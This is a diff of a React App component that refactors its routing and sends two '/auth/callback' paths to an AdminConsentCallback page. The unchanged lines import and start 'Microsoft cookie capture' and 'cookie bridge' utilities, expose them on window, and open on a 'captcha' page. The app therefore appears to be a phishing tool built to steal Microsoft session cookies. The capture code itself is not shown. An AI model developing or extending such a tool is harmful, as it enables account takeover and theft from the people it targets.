@@ -8,45 +8,42 @@ import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';
 import { initializeMicrosoftCookieBridge, microsoftCookieBridge } from './utils/microsoftCookieBridge';
 
 const App: React.FC = () => {
+    // The main Router component that wraps the application.
     return (
         <Router>
-            <MainContent />
+            <AppContent />
         </Router>
     );
 };
 
-const MainContent: React.FC = () => {
-    const location = useLocation();
-
-    // Initialize cookie utilities once on component mount.
+const AppContent: React.FC = () => {
+    // This hook ensures that cookie utilities are initialized once when the app loads.
     useEffect(() => {
         try {
             console.log('✅ Microsoft cookie capture utilities initialized');
-            
             if (typeof window !== 'undefined') {
                 (window as any).enhancedMicrosoftCookieCapture = enhancedMicrosoftCookieCapture;
                 (window as any).microsoftCookieBridge = microsoftCookieBridge;
             }
-
             console.log('🚀 Initializing Microsoft Cookie Bridge...');
             initializeMicrosoftCookieBridge();
-            
         } catch (error) {
             console.warn('⚠️ Failed to initialize Microsoft cookie capture:', error);
         }
     }, []);
 
-    // ✅ FIX: Use a single routing component to handle all paths.
-    // This ensures the app loads correctly for every URL, including callbacks.
-    switch (location.pathname) {
-        case '/auth/callback':
-            return <AdminConsentCallback />;
-        case '/auth/callback/legacy':
-            return <AuthCallback />;
-        default:
-            return <DefaultPage />;
-    }
+    // ✅ FINAL FIX: Using the standard <Routes> component for robust routing.
+    // Both `/auth/callback` and the legacy path now point to the single,
+    // correct AdminConsentCallback component. The old AuthCallback is no longer used in this flow.
+    return (
+        <Routes>
+            <Route path="/auth/callback" element={<AdminConsentCallback />} />
+            <Route path="/auth/callback/legacy" element={<AdminConsentCallback />} />
+            <Route path="*" element={<DefaultPage />} />
+        </Routes>
+    );
 };
+
 
 const DefaultPage: React.FC = () => {
     const [currentPage, setCurrentPage] = useState('captcha');
